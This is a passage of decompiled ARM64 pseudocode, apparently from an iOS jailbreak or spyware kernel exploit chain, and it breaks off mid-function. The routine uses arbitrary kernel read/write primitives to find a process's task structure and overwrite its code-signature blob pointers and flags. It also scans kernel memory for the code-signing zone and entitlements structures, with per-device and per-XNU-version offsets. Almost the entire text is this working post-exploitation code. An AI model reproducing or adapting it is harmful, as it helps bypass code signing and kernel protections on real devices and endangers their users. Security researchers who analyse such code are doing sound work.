//----- (000000000002FA24) ----------------------------------------------------
void __fastcall csblob_proc_patch_dispatch(struct csblob_proc_patch_dispatch_args *args)
{
  __int64 v2; // x20
  int *v3; // x21
  unsigned __int64 v4; // x24
  bool v5; // cc
  unsigned __int64 v6; // x0
  unsigned __int64 v7; // x23
  __int64 v8; // x27
  __int64 v9; // x9
  __int64 v10; // x8
  int v11; // w0
  int v12; // w8
  int v13; // w23
  unsigned __int64 v14; // x0
  unsigned __int64 v15; // x25
  __int64 v16; // x27
  int v17; // w22
  int *v18; // x24
  __int64 v19; // x23
  uint64_t *v20; // x0
  uint64_t *v21; // x25
  int v22; // w25
  __int64 v23; // x25
  unsigned __int64 v24; // x27
  unsigned __int64 v25; // x8
  mach_vm_address_t v26; // x24
  int v27; // w24
  void *v28; // x23
  int v29; // w0
  unsigned __int64 v30; // x1
  int v31; // w23
  int v32; // w0
  char v33; // w24
  __int64 v34; // x2
  int v35; // w24
  unsigned __int64 v36; // x8
  unsigned int v37; // w10
  __int64 v38; // x2
  __int64 v39; // x8
  int v40; // w21
  unsigned __int64 v41; // x8
  unsigned int v42; // w23
  __int64 v43; // x9
  __int64 v44; // x25
  unsigned __int64 v45; // x9
  unsigned __int64 v46; // x8
  unsigned int v47; // w25
  __int64 v48; // x22
  uint64_t *v49; // x0
  uint64_t *v50; // x27
  __int64 v51; // x25
  int v52; // w12
  unsigned __int64 v53; // x8
  int v54; // w0
  int v55; // w9
  int v56; // w10
  unsigned int v57; // w1
  int v58; // w24
  unsigned int v59; // w11
  int v60; // w23
  unsigned int v61; // w0
  unsigned __int64 v62; // x10
  int v63; // w8
  int v64; // w8
  unsigned __int64 v65; // x0
  unsigned __int64 v66; // x21
  __int64 v67; // x21
  mach_vm_address_t v68; // x23
  char v69; // w23
  unsigned __int64 v70; // x24
  __int64 v71; // x8
  unsigned int *v72; // x0
  unsigned int v73; // w8
  __int64 v74; // x2
  unsigned __int64 v75; // x0
  unsigned __int64 v76; // x24
  __int64 v77; // x8
  int v78; // w0
  unsigned __int64 v79; // x0
  unsigned int v80; // w0
  int v81; // w1
  __int64 v82; // x9
  __int64 v83; // x24
  mach_port_t v84; // w0
  unsigned __int64 v85; // x0
  int v86; // w0
  unsigned __int64 v87; // x24
  __int64 v88; // x8
  unsigned int v89; // w9
  unsigned int v90; // w9
  int v91; // w0
  void *(__cdecl *v92)(void *); // x0
  int v93; // w0
  int v94; // w0
  int v95; // w24
  int v96; // w8
  int v97; // w24
  unsigned __int64 v98; // x8
  __int64 v99; // x9
  __int64 v100; // x1
  char v101; // w27
  int v102; // w24
  int v103; // w0
  unsigned __int64 v104; // x23
  thread_act_t v105; // w0
  mach_port_t v106; // w0
  int v107; // w0
  void *(__cdecl *v108)(void *); // x0
  int v109; // w0
  int v110; // w8
  unsigned int v111; // w24
  unsigned __int64 v112; // x0
  unsigned __int64 v113; // x23
  int v114; // w8
  int v115; // w8
  __int64 v116; // x8
  unsigned __int64 v117; // x0
  int v118; // w0
  int v119; // w8
  int v120; // w23
  char *v121; // x27
  int v122; // w21
  bool v123; // zf
  __int64 v124; // x27
  int v125; // w0
  unsigned __int64 v126; // x0
  unsigned __int64 v127; // x21
  __int64 v128; // x8
  __int64 v129; // x9
  unsigned __int64 v130; // x21
  int v131; // w0
  int v132; // w8
  int v133; // w8
  int v134; // w0
  kern_return_t v135; // w0
  int v136; // w0
  int v137; // w0
  int v138; // w23
  int v139; // w21
  __int64 v140; // [xsp+10h] [xbp-4E0h]
  thread_act_t target_act[2]; // [xsp+18h] [xbp-4D8h]
  thread_act_t target_acta[2]; // [xsp+18h] [xbp-4D8h]
  thread_act_t target_actb; // [xsp+18h] [xbp-4D8h]
  unsigned __int64 v144; // [xsp+20h] [xbp-4D0h]
  __int64 v145; // [xsp+20h] [xbp-4D0h]
  unsigned __int64 v146; // [xsp+20h] [xbp-4D0h]
  unsigned int v147; // [xsp+28h] [xbp-4C8h]
  __int64 v148; // [xsp+28h] [xbp-4C8h]
  int v149; // [xsp+28h] [xbp-4C8h]
  unsigned int v150; // [xsp+30h] [xbp-4C0h]
  int v151; // [xsp+30h] [xbp-4C0h]
  int bufSize; // [xsp+34h] [xbp-4BCh]
  unsigned int bufSizea; // [xsp+34h] [xbp-4BCh]
  char bufSizeb; // [xsp+34h] [xbp-4BCh]
  char bufSizec; // [xsp+34h] [xbp-4BCh]
  unsigned int bufSized; // [xsp+34h] [xbp-4BCh]
  __int64 bufSize_4; // [xsp+38h] [xbp-4B8h]
  int bufSize_4a; // [xsp+38h] [xbp-4B8h]
  unsigned int size; // [xsp+40h] [xbp-4B0h]
  int sizea; // [xsp+40h] [xbp-4B0h]
  int size_4; // [xsp+44h] [xbp-4ACh]
  int size_4a; // [xsp+44h] [xbp-4ACh]
  __int64 v163; // [xsp+48h] [xbp-4A8h]
  unsigned int v164; // [xsp+48h] [xbp-4A8h]
  void *buf; // [xsp+50h] [xbp-4A0h]
  int bufa; // [xsp+50h] [xbp-4A0h]
  __int64 bufb; // [xsp+50h] [xbp-4A0h]
  __int64 bufc; // [xsp+50h] [xbp-4A0h]
  __int64 v169; // [xsp+58h] [xbp-498h]
  __int64 v170; // [xsp+58h] [xbp-498h]
  int v171; // [xsp+64h] [xbp-48Ch] BYREF
  unsigned int v172; // [xsp+68h] [xbp-488h] BYREF
  unsigned int v173; // [xsp+6Ch] [xbp-484h] BYREF
  mach_port_name_t name[4]; // [xsp+70h] [xbp-480h] BYREF
  __int128 v175; // [xsp+80h] [xbp-470h]
  __int128 v176; // [xsp+90h] [xbp-460h]
  __int128 v177; // [xsp+A0h] [xbp-450h]
  __int128 v178; // [xsp+B0h] [xbp-440h]
  unsigned __int64 __src[4]; // [xsp+C8h] [xbp-428h] BYREF
  __int64 v180; // [xsp+E8h] [xbp-408h]
  __int128 v181; // [xsp+F0h] [xbp-400h] BYREF
  __int128 v182; // [xsp+100h] [xbp-3F0h]
  __int128 v183; // [xsp+110h] [xbp-3E0h]
  __int64 v184; // [xsp+120h] [xbp-3D0h]
  unsigned __int8 v185; // [xsp+12Ah] [xbp-3C6h] BYREF
  char v186; // [xsp+12Bh] [xbp-3C5h] BYREF
  unsigned int v187; // [xsp+12Ch] [xbp-3C4h] BYREF
  mach_vm_address_t v188; // [xsp+130h] [xbp-3C0h] BYREF
  __int64 v189; // [xsp+138h] [xbp-3B8h] BYREF
  __int64 v190; // [xsp+140h] [xbp-3B0h] BYREF
  unsigned int v191; // [xsp+14Ch] [xbp-3A4h] BYREF
  unsigned int v192; // [xsp+150h] [xbp-3A0h] BYREF
  int v193; // [xsp+154h] [xbp-39Ch] BYREF
  __int64 newBytes; // [xsp+158h] [xbp-398h] BYREF
  int v195; // [xsp+160h] [xbp-390h] BYREF
  __int64 v196; // [xsp+168h] [xbp-388h]
  __int64 v197; // [xsp+178h] [xbp-378h]
  int v198; // [xsp+190h] [xbp-360h]
  int v199; // [xsp+1A0h] [xbp-350h]
  unsigned int v200; // [xsp+1ACh] [xbp-344h]
  int v201; // [xsp+1B0h] [xbp-340h]
  __int64 v202; // [xsp+1C8h] [xbp-328h] BYREF
  int v203; // [xsp+1D4h] [xbp-31Ch] BYREF
  unsigned __int64 v204; // [xsp+1D8h] [xbp-318h] BYREF
  void *v205; // [xsp+1E0h] [xbp-310h] BYREF
  unsigned int v206; // [xsp+1ECh] [xbp-304h] BYREF
  void *v207; // [xsp+1F0h] [xbp-300h] BYREF
  unsigned __int64 v208; // [xsp+1F8h] [xbp-2F8h] BYREF
  unsigned __int64 v209; // [xsp+200h] [xbp-2F0h] BYREF
  pthread_t v210; // [xsp+208h] [xbp-2E8h] BYREF
  unsigned int v211; // [xsp+214h] [xbp-2DCh] BYREF
  uint8_t v212[48]; // [xsp+218h] [xbp-2D8h] BYREF
  unsigned __int64 v213; // [xsp+248h] [xbp-2A8h] BYREF
  void *v214; // [xsp+250h] [xbp-2A0h]
  __int64 v215; // [xsp+258h] [xbp-298h]
  __int128 v216; // [xsp+280h] [xbp-270h] BYREF
  __int128 v217; // [xsp+290h] [xbp-260h]
  __int128 v218; // [xsp+2A0h] [xbp-250h]
  __int128 v219; // [xsp+2B0h] [xbp-240h]
  __int128 v220; // [xsp+2C0h] [xbp-230h]
  __int128 v221; // [xsp+2D0h] [xbp-220h]
  __int128 v222; // [xsp+2E0h] [xbp-210h]
  __int128 v223; // [xsp+2F0h] [xbp-200h]
  __int128 v224; // [xsp+300h] [xbp-1F0h]
  __int128 v225; // [xsp+310h] [xbp-1E0h]
  __int128 v226; // [xsp+320h] [xbp-1D0h]
  __int128 v227; // [xsp+330h] [xbp-1C0h]
  __int128 v228; // [xsp+340h] [xbp-1B0h]
  __int128 v229; // [xsp+350h] [xbp-1A0h]
  __int128 v230; // [xsp+360h] [xbp-190h]
  __int128 v231; // [xsp+370h] [xbp-180h]
  __int128 v232; // [xsp+380h] [xbp-170h]
  __int128 v233; // [xsp+390h] [xbp-160h]
  __int128 v234; // [xsp+3A0h] [xbp-150h]
  __int128 v235; // [xsp+3B0h] [xbp-140h]
  __int128 v236; // [xsp+3C0h] [xbp-130h]
  __int128 v237; // [xsp+3D0h] [xbp-120h]
  __int128 v238; // [xsp+3E0h] [xbp-110h]
  __int128 v239; // [xsp+3F0h] [xbp-100h]
  __int128 v240; // [xsp+400h] [xbp-F0h]
  __int128 v241; // [xsp+410h] [xbp-E0h]
  __int128 v242; // [xsp+420h] [xbp-D0h]
  __int128 v243; // [xsp+430h] [xbp-C0h]
  __int128 v244; // [xsp+440h] [xbp-B0h]
  __int128 v245; // [xsp+450h] [xbp-A0h]
  __int128 v246; // [xsp+460h] [xbp-90h]
  __int128 v247; // [xsp+470h] [xbp-80h]

  v2 = (uint64_t)args->krwCtx;
  v3 = (int *)args->csblobCtx;
  v4 = args->krwCtx->xnuVersionPacked;
  v5 = (args->krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v4 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023);
  if ( !v5 )
  {
    v204 = 0;
    v205 = 0;
    v203 = -1;
    v202 = 0x20000000;
    newBytes = 0;
    v193 = 0;
    v188 = 0;
    v189 = 0;
    v187 = 0;
    v11 = krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK);
    v12 = 0;
    if ( (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
      goto LABEL_466;
    v13 = v11;
    if ( (unsigned int)csblob_alloc_and_fill_slots(
                         (__int64)v3,
                         &v205,
                         &v204,
                         (unsigned int *)&newBytes + 1,
                         (unsigned int *)&newBytes,
                         (unsigned int *)&v193) )
    {
      v198 = -1;
      v14 = kread_task_struct((struct_krwCtx *)v2, v3[17]);
      if ( !v14 )
      {
        v22 = 5;
LABEL_352:
        v122 = v203;
        if ( v203 != -1 )
        {
          if ( v188 && v189 && !kwrite64(v2, v188, v189) )
            v22 = 5;
          close(v122);
        }
        if ( v205 )
          free(v205);
        v123 = v22 == 0;
        goto LABEL_463;
      }
      v15 = v14;
      if ( !(unsigned int)get_csblob_offset_pair(v2, (int *)&v192, (int *)&v191) )
        goto LABEL_349;
      v16 = v15 + v191;
      if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, v16, 8, &v190) )
        goto LABEL_349;
      if ( v190 == 0x20000000 )
      {
        v17 = 0;
        v18 = v3;
LABEL_33:
        v19 = v204;
        if ( v204 > *((uint64_t *)v18 + 2) )
        {
          LODWORD(v209) = v204;
          v20 = alloc_physmap_page_aligned((struct_krwCtx *)v2, (unsigned int *)&v209);
          if ( !v20 )
            goto LABEL_349;
          *((uint64_t *)v18 + 3) = v20;
          v21 = v18 + 6;
          *((uint64_t *)v18 + 2) = (unsigned int)v209;
          if ( !(unsigned int)kwrite_with_retry(v2, (__int64)v20, (__int64)v205, v19)
            || !kwrite64(v2, *((uint64_t *)v18 + 1) + 64LL, *((uint64_t *)v18 + 3))
            || !kwrite64(v2, *((uint64_t *)v18 + 1) + 48LL, *((uint64_t *)v18 + 2)) )
          {
            goto LABEL_349;
          }
LABEL_63:
          if ( kwrite64(v2, *((uint64_t *)v18 + 1) + 120LL, *((uint64_t *)v18 + 3) + HIDWORD(newBytes)) )
          {
            v34 = (uint32_t)newBytes ? *v21 + (unsigned int)newBytes : 0LL;
            if ( kwrite64(v2, *((uint64_t *)v18 + 1) + 136LL, v34) )
            {
              if ( *(uint64_t *)(v2 + 344) <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)
                || (!v193 ? (v38 = 0) : (v38 = *v21 + (unsigned int)v193),
                    kwrite64(v2, *((uint64_t *)v18 + 1) + 152LL, v38)) )
              {
                if ( v190 == 0x20000000
                  || ((!v17
                   || (*((uint8_t *)v3 + 3) & 4) != 0
                   || ((*(uint64_t *)name = 0, *(uint64_t *)&v181 = 0, v213 = 0, (v68 = *((uint64_t *)v3 + 4)) != 0)
                   && kread_physmap_decorated((struct_krwCtx *)v2, *((uint64_t *)v3 + 4), (unsigned __int64 *)name)
                   && *(uint64_t *)name
                   && (*(uint64_t *)name == *((uint64_t *)v3 + 1)
                    || (kread_physmap_decorated((struct_krwCtx *)v2, *(unsigned __int64 *)name, (unsigned __int64 *)&v181)
                    && (uint64_t)v181
                    && kread_physmap_decorated((struct_krwCtx *)v2, v181, &v213)
                    && !v213
                    && kwrite64(v2, v68, v181)
                    && kwrite64(v2, *(mach_vm_address_t *)name, 0)
                    && kwrite64(v2, v181, *(__int64 *)name)))))
                  && (unsigned int)proc_kread_and_patch_slot((struct_krwCtx *)v2, v3[17], v190)
                  && (v190 = 0x20000000, (unsigned int)kwrite_with_retry(v2, v16, (__int64)&v190, 8))) )
                {
                  v22 = 0;
                  goto LABEL_350;
                }
              }
            }
          }
          goto LABEL_349;
        }
        v21 = v18 + 6;
        if ( (unsigned int)kwrite_with_retry(v2, *((uint64_t *)v18 + 3), (__int64)v205, v204) )
          goto LABEL_63;
LABEL_349:
        v22 = 5;
        goto LABEL_350;
      }
      if ( v13 )
      {
        v23 = v204;
        buf = v205;
        v169 = v16;
        v163 = HIDWORD(newBytes);
        *(uint64_t *)&v181 = 0;
        v213 = *((uint64_t *)v3 + 4);
        v24 = v213;
        v208 = 0;
        v230 = 0u;
        v231 = 0u;
        v228 = 0u;
        v229 = 0u;
        v226 = 0u;
        v227 = 0u;
        v224 = 0u;
        v225 = 0u;
        v222 = 0u;
        v223 = 0u;
        v220 = 0u;
        v221 = 0u;
        v218 = 0u;
        v219 = 0u;
        v216 = 0u;
        v217 = 0u;
        size_4 = krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK);
        if ( v24 )
        {
          if ( kread_physmap_decorated((struct_krwCtx *)v2, v24, &v213) )
          {
            v25 = v213;
            if ( v213 )
            {
              while ( 1 )
              {
                v26 = v25;
                if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, v25 + 24, 8, &v181) )
                  break;
                if ( (uint64_t)v181 == 0x20000000 )
                {
                  if ( v213 )
                  {
                    v17 = 0;
                    goto LABEL_110;
                  }
LABEL_121:
                  size = get_version_specific_offset((struct_krwCtx *)v2);
                  if ( !size )
                    goto LABEL_349;
                  v206 = v23;
                  v49 = alloc_physmap_page_aligned((struct_krwCtx *)v2, &v206);
                  if ( !v49 )
                    goto LABEL_349;
                  v50 = v49;
                  bufSize_4 = v206;
                  if ( !(unsigned int)kwrite_with_retry(v2, (__int64)v49, (__int64)buf, v23) )
                    goto LABEL_349;
                  *(uint64_t *)name = 0;
                  if ( *(uint64_t *)(v2 + 344) <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
                  {
                    v211 = size;
                    bufb = alloc_physmap_page(v2, &v211);
                    if ( !bufb )
                      goto LABEL_349;
                  }
                  else
                  {
                    v51 = *(uint64_t *)(v2 + 6584);
                    if ( !v51 )
                    {
                      v117 = kernel_cstring_pattern_scan(v2, "cs_blob zone");
                      if ( !v117 )
                        goto LABEL_349;
                      v51 = v117;
                      if ( (unsigned int)find_kfunc_ptr_in_kernel_data((struct_krwCtx *)v2, v117) )
                        goto LABEL_349;
                      *(uint64_t *)(v2 + 6584) = v51;
                    }
                    if ( (unsigned int)resolve_kfunc_via_page_dispatch(
                                         (struct_krwCtx *)v2,
                                         v51,
                                         size,
                                         (__int64 *)name,
                                         (__int64 (__fastcall *)(__int64, __int64))get_dyld_slide_info,
                                         0) )
                      goto LABEL_349;
                    bufb = *(uint64_t *)name;
                    if ( !*(uint64_t *)name )
                      goto LABEL_349;
                  }
                  if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, *((uint64_t *)v3 + 1), size, &v216) )
                    goto LABEL_349;
                  v207 = 0;
                  __memcpy_chk(&v216, &v207, *(int *)(v2 + 360), 0x100u);
                  *(uint64_t *)&v181 = 0x20000000;
                  *((uint64_t *)&v217 + 1) = 0x20000000;
                  *(uint64_t *)&v220 = v50;
                  *(uint64_t *)&v219 = bufSize_4;
                  v210 = (pthread_t)((char *)v50 + v163);
                  __memcpy_chk((char *)&v216 + 0x78, &v210, *(int *)(v2 + 360), 0x88u);
                  v98 = *(uint64_t *)(v2 + 344);
                  v99 = 144;
                  if ( v98 > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
                    v99 = 152;
                  if ( v98 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
                    v99 = 168;
                  v100 = *(uint64_t *)((char *)&v216 + v99);
                  __src[0] = v100;
                  if ( v100 )
                  {
                    if ( v98 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
                    {
                      __src[0] = 0;
                      memcpy((char *)&v216 + v99, __src, *(int *)(v2 + 360));
                    }
                    else if ( (unsigned int)kread_and_kwrite_u16_plus8_bumped(v2, v100) )
                    {
                      goto LABEL_349;
                    }
                  }
                  v209 = *((uint64_t *)&v224 + 1);
                  if ( *((uint64_t *)&v224 + 1) )
                  {
                    v209 = (unsigned __int64)v50 + *((uint64_t *)&v224 + 1) - *((uint64_t *)v3 + 3);
                    __memcpy_chk((char *)&v216 + 0x88, &v209, *(int *)(v2 + 360), 0x78u);
                  }
                  if ( *(uint64_t *)(v2 + 344) > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
                  {
                    v208 = *((uint64_t *)&v225 + 1);
                    if ( *((uint64_t *)&v225 + 1) )
                    {
                      v208 = (unsigned __int64)v50 + *((uint64_t *)&v225 + 1) - *((uint64_t *)v3 + 3);
                      __memcpy_chk((char *)&v216 + 0x98, &v208, *(int *)(v2 + 360), 0x68u);
                    }
                  }
                  if ( size_4 )
                  {
                    *(uint64_t *)name = 0;
                    v121 = (char *)&v216 + size - *(uint32_t *)(v2 + 360);
                    __memcpy_chk(name, v121, *(int *)(v2 + 360), 8u);
                    if ( *(uint64_t *)name && !validate_kaddr_range(v2, *(__int64 *)name) )
                      goto LABEL_349;
                    *(uint64_t *)name = 0;
                    memcpy(v121, name, *(int *)(v2 + 360));
                  }
                  if ( !(unsigned int)kwrite_with_retry(v2, bufb, (__int64)&v216, size) || !kwrite64(v2, v26, bufb) )
                    goto LABEL_349;
                  goto LABEL_348;
                }
                if ( !kread_physmap_decorated((struct_krwCtx *)v2, v213, &v213) )
                  goto LABEL_349;
                v25 = v213;
                if ( !v213 )
                  goto LABEL_121;
              }
            }
          }
        }
        goto LABEL_349;
      }
      if ( !kread_physmap_decorated((struct_krwCtx *)v2, v15 + v192, __src)
        || !(unsigned int)wire_proc_page_via_kobject((struct_krwCtx *)v2, __src[0], &v188, &v189, &v203) )
      {
        goto LABEL_349;
      }
      v216 = 0x20000000u;
      *(uint64_t *)&v217 = 0x40000000;
      v35 = v203;
      if ( (fcntl(v203, 59, &v216) & 0x80000000) == 0 )
      {
        v17 = 0;
LABEL_111:
        if ( !(unsigned int)csblob_chain_walk_offsets((struct_krwCtx *)v2, v3[17], &v202, 1u, (__int64)&v195) )
          goto LABEL_349;
        v18 = &v195;
        if ( !v13 && v17 )
        {
          if ( (*((uint8_t *)v3 + 3) & 4) == 0 )
          {
            v48 = *(uint64_t *)(v2 + 344) <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 128LL : 136LL;
            if ( !kread_physmap_decorated((struct_krwCtx *)v2, v48 + *((uint64_t *)v3 + 1), (unsigned __int64 *)&v210)
              || !kwrite64(v2, v196 + v48, (__int64)v210) )
            {
              goto LABEL_349;
            }
          }
          v18 = &v195;
          v17 = 1;
        }
        goto LABEL_33;
      }
      if ( errno != 7 )
        goto LABEL_349;
      v46 = *(uint64_t *)(v2 + 344);
      if ( v46 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      {
        if ( v46 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
        {
          v47 = 168;
          if ( v46 <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
          {
            if ( *(int *)(v2 + 320) <= 7194 )
              v47 = 168;
            else
              v47 = 160;
          }
        }
        else
        {
          v47 = 184;
        }
      }
      else
      {
        v47 = 172;
      }
      if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, *((uint64_t *)v3 + 1) + v47, 1, &v187) )
        goto LABEL_349;
      v169 = v16;
      v101 = v187;
      if ( !(unsigned int)csblob_compute_and_copy_hash((struct csblob_walk_ctx *)v3, v212) )
        goto LABEL_349;
      if ( !physmap_single_check(v2, (__int64)v212, 20) )
        goto LABEL_349;
      if ( (v101 & 1) == 0 )
      {
        name[0] = v187 | 1;
        if ( !(unsigned int)physmap_kwrite_chain_entry((struct_krwCtx *)v2, *((uint64_t *)v3 + 4), v47, name, 1) )
          goto LABEL_349;
      }
      *(uint64_t *)&v216 = 0x20000000;
      *((uint64_t *)&v216 + 1) = v205;
      *(uint64_t *)&v217 = v204;
      v102 = fcntl(v35, 59, &v216);
      if ( v102 < 0 )
      {
        __error();
        if ( (v101 & 1) != 0 )
          goto LABEL_349;
      }
      else if ( (v101 & 1) != 0 )
      {
LABEL_348:
        v17 = 1;
LABEL_110:
        v16 = v169;
        goto LABEL_111;
      }
      v17 = 1;
      v118 = physmap_kwrite_chain_entry((struct_krwCtx *)v2, *((uint64_t *)v3 + 4), v47, &v187, 1);
      v22 = 5;
      if ( !v118 || (v16 = v169, v102 < 0) )
      {
LABEL_350:
        if ( v198 != -1 )
          csblob_free_entry((struct csblob_walk_ctx *)&v195);
        goto LABEL_352;
      }
      goto LABEL_111;
    }
LABEL_39:
    v12 = 0;
    goto LABEL_466;
  }
  v207 = 0;
  v205 = 0;
  v193 = -1;
  v192 = 0;
  v191 = 0;
  v187 = 0;
  v188 = 0;
  v189 = 0;
  v171 = 0;
  if ( !(unsigned int)csblob_alloc_and_fill_slots((__int64)v3, &v207, (size_t *)&v205, &v192, &v191, &v187) )
    goto LABEL_39;
  v198 = -1;
  if ( !*((uint8_t *)v3 + 96)
    && *((uint64_t *)v3 + 5) >> 29
    && (v3[19] != v192
     || (v3[21] != v191 && !v187)
     || (v3[22] != v187 && *(uint64_t *)(v2 + 344) > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023))) )
  {
    goto LABEL_451;
  }
  v6 = kread_task_struct((struct_krwCtx *)v2, v3[17]);
  if ( !v6 )
    goto LABEL_451;
  v7 = v6;
  if ( !(unsigned int)get_csblob_offset_pair(v2, (int *)&v173, (int *)&v172) )
    goto LABEL_451;
  v8 = v7 + v172;
  if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, v8, 8, &v202) )
    goto LABEL_451;
  v9 = v202;
  if ( v202 >= 0x20000000 && !*((uint8_t *)v3 + 96) )
  {
    v27 = 0;
    goto LABEL_51;
  }
  if ( !kread_physmap_decorated((struct_krwCtx *)v2, v7 + v173, (unsigned __int64 *)&v190)
    || !(unsigned int)wire_proc_page_via_kobject((struct_krwCtx *)v2, v190, &v188, &v189, &v193) )
  {
    goto LABEL_451;
  }
  if ( *((uint8_t *)v3 + 96) )
  {
    if ( v202 > 0x7FFFFFFFFFLL )
      goto LABEL_451;
    if ( v202 >= 0x20000000 )
      v10 = v202 + 0x20000000;
    else
      v10 = 0x20000000;
  }
  else
  {
    v10 = 0x20000000;
  }
  v170 = v10;
  v213 = v10;
  v214 = 0;
  v215 = 0x40000000;
  v31 = v193;
  v32 = fcntl(v193, 59, &v213);
  if ( (v32 & 0x80000000) == 0 )
  {
    if ( *((uint8_t *)v3 + 96) )
      goto LABEL_451;
    bufa = v32;
    v33 = 0;
    goto LABEL_59;
  }
  bufa = v32;
  if ( errno != 7 )
    goto LABEL_451;
  v36 = *(uint64_t *)(v2 + 344);
  if ( v36 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    if ( v36 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    {
      v37 = 168;
      if ( v36 <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
      {
        if ( *(int *)(v2 + 320) <= 7194 )
          v37 = 168;
        else
          v37 = 160;
      }
    }
    else
    {
      v37 = 184;
    }
  }
  else
  {
    v37 = 172;
  }
  v164 = v37;
  if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, *((uint64_t *)v3 + 1) + v37, 1, &v171) )
    goto LABEL_451;
  v52 = v171 & 1;
  if ( v4 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    goto LABEL_142;
  bufSize = v171 & 1;
  if ( !(unsigned int)csblob_compute_and_copy_hash((struct csblob_walk_ctx *)v3, v212) || !physmap_single_check(v2, (__int64)v212, 20) )
    goto LABEL_451;
  v52 = bufSize;
  if ( bufSize )
  {
LABEL_142:
    bufSize_4a = 0;
LABEL_143:
    v53 = *(uint64_t *)(v2 + 344);
    goto LABEL_144;
  }
  if ( (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 || (v53 = *(uint64_t *)(v2 + 344), v53 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023)) )
  {
    LODWORD(v216) = v171 | 1;
    bufSize_4a = 1;
    v54 = physmap_kwrite_chain_entry((struct_krwCtx *)v2, *((uint64_t *)v3 + 4), v164, &v216, 1);
    v52 = 0;
    if ( !v54 )
      goto LABEL_451;
    goto LABEL_143;
  }
  bufSize_4a = 0;
  v52 = 0;
LABEL_144:
  if ( v53 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
  {
    v55 = 0;
    LOBYTE(sizea) = 0;
  }
  else
  {
    sizea = *((unsigned __int8 *)v3 + 97);
    v55 = sizea != 0;
  }
  v213 = v170;
  v214 = v207;
  v215 = (__int64)v205;
  if ( v4 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
  {
    v56 = 0;
    LODWORD(v208) = v31;
    v57 = v3[17];
    v184 = 0;
    v183 = 0u;
    v182 = 0u;
    v181 = 0u;
    LOWORD(v204) = 0;
    v209 = 0;
    v210 = 0;
    v177 = 0u;
    v178 = 0u;
    v175 = 0u;
    v176 = 0u;
    *(__int128 *)name = 0u;
    if ( v55 )
      v56 = (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 && v53 < XNU_VERSION_PACKED(8019, 60, 40, 0, 0);
    if ( v52 )
    {
      v52 = 0;
      v59 = 0;
      v58 = 4097;
    }
    else
    {
      v58 = 4097;
      if ( (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
      {
        v59 = 0;
        if ( v53 < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
        {
          v147 = v57;
          v60 = v56;
          v61 = get_version_specific_offset((struct_krwCtx *)v2);
          if ( !v61 )
          {
            v115 = 163857;
            goto LABEL_441;
          }
          bufSizea = v61;
          if ( *(uint64_t *)(v2 + 6584) )
          {
            v58 = 4097;
          }
          else
          {
            v146 = kernel_cstring_pattern_scan(v2, "cs_blob zone");
            if ( !v146 )
            {
              v115 = 4097;
              goto LABEL_441;
            }
            size_4a = find_kfunc_ptr_in_kernel_data((struct_krwCtx *)v2, v146);
            if ( size_4a )
              goto LABEL_442;
            v58 = 0;
            *(uint64_t *)(v2 + 6584) = v146;
          }
          v52 = 1;
          v56 = v60;
          v59 = bufSizea;
          v57 = v147;
        }
      }
      else
      {
        v59 = 0;
      }
    }
    v151 = v56;
    bufSized = v59;
    v149 = v52;
    if ( v56 )
    {
      if ( !*(uint64_t *)(v2 + 6576) || !*(uint32_t *)(v2 + 6592) )
      {
        v111 = v57;
        v112 = kernel_cstring_pattern_scan(v2, "iokit.OSEntitlements");
        if ( !v112 )
        {
          v115 = 708625;
          goto LABEL_441;
        }
        v113 = v112;
        size_4a = find_kfunc_ptr_in_kernel_data((struct_krwCtx *)v2, v112);
        if ( size_4a )
          goto LABEL_442;
        if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, v113 + 54, 2, &v216) )
        {
          v115 = 163855;
          goto LABEL_441;
        }
        v114 = (unsigned __int16)v216;
        size_4a = 163857;
        if ( (unsigned int)(unsigned __int16)v216 - 1 > 0x1FF
          || ((*(uint32_t *)(v2 + 360) - 1) & (unsigned __int16)v216) != 0 )
        {
          goto LABEL_442;
        }
        *(uint64_t *)(v2 + 6576) = v113;
        *(uint32_t *)(v2 + 6592) = v114;
        v57 = v111;
      }
      if ( !(unsigned int)necp_set_opt_string_6(v2, v57) )
      {
        size_4a = 163865;
        goto LABEL_442;
      }
      size_4a = 163878;
